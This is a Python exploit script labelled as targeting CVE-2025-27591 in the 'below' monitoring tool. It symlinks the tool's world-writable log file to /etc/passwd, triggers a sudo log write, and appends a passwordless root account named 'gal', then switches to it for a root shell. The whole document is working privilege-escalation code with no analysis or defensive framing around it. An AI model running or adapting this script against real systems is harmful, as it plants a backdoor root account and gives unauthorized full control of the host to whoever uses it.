#!/usr/bin/env python3
import os
import subprocess

LOG_DIR = "/var/log/below"
LOG_FILE = f"{LOG_DIR}/error_jacob.log"
TARGET_FILE = "/etc/passwd"
TMP_PAYLOAD = "/tmp/payload"
FAKE_USER_LINE = "gal::0:0:gal:/root:/bin/bash\n"

def run(cmd):
    print(f"[+] Running: {cmd}")
    subprocess.call(cmd, shell=True)

def main():
    print("[*] CVE-2025-27591 exploit (simple version)")

    # Step 1: Create payload file
    with open(TMP_PAYLOAD, "w") as f:
        f.write(FAKE_USER_LINE)
    print(f"[+] Payload written to {TMP_PAYLOAD}")

    # Step 2: Ensure log dir exists and is writable
    if not os.access(LOG_DIR, os.W_OK):
        print("[-] Log directory is not world-writable or does not exist.")
        return
    print(f"[+] {LOG_DIR} is writable.")

    # Step 3: Remove log file if it exists
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)

    # Step 4: Create symlink to /etc/passwd
    os.symlink(TARGET_FILE, LOG_FILE)
    print(f"[+] Symlink created: {LOG_FILE} -> {TARGET_FILE}")

    # Step 5: Trigger sudo log write via `below`
    try:
        print("[*] Triggering sudo log write...")
        subprocess.run(["sudo", "/usr/bin/below", "record"], timeout=5)
    except subprocess.TimeoutExpired:
        print("[*] below timed out (expected)")

    # Step 6: Append payload into /etc/passwd using symlink
    run(f"cat {TMP_PAYLOAD} >> {LOG_FILE}")
    print("[+] Payload appended to /etc/passwd")

    run("su gal")

if __name__ == "__main__":
    main()